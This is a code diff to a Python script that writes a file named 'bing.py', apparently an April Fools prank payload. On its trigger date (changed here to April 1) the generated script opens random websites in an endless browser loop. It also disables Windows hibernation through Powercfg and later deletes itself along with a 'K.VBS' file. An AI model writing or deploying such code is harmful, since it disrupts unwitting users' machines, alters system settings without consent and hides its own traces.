@@ -11,13 +11,13 @@ except:
 		
 	except:
 		try:
-			os.chdir("C:/Python35")
+			os.chdir("F:")
 		except:
 			print("defalt directry not found")
 			print("input new directry")
 			os.chdir(input())
 f=open("bing.py","w")
-f.write('import datetime\nimport webbrowser\nimport os\nimport time\nimport random\ncounter=0\nx = datetime.datetime.now()\nif x.strftime("%m %d") == "03 20":\n	april=True\nelif int(x.strftime("%m%d")) >=int(401):\n        os.remove("K.VBS")\n        os.remove("bing.py")\n        exit\nelse:\n	april=False\n	print("not today")\nos.system("Powercfg -H OFF")\nbrake=random.randint(1, 20)\n')
+f.write('import datetime\nimport webbrowser\nimport os\nimport time\nimport random\ncounter=0\nx = datetime.datetime.now()\nif x.strftime("%m %d") == "04 01":\n	april=True\nelif int(x.strftime("%m%d")) >=int(401):\n        os.remove("K.VBS")\n        os.remove("bing.py")\n        exit\nelse:\n	april=False\n	print("not today")\nos.system("Powercfg -H OFF")\nbrake=random.randint(1, 20)\n')
 f.write('print(brake)\nspear_url=["facebook.com","youtube.com","kgsorkney.com","wikipedia.org","baidu.com","hamishknox.co.uk","reddit.com","yahoo.com","coca-cola.co.uk","netflix.com"]')
 f.write('\nwhile april == True:\n')
 f.write('	webbrowser.open("www."+str(spear_url[random.randint(0, int(len(spear_url)-1))]))\n	counter=counter+1')
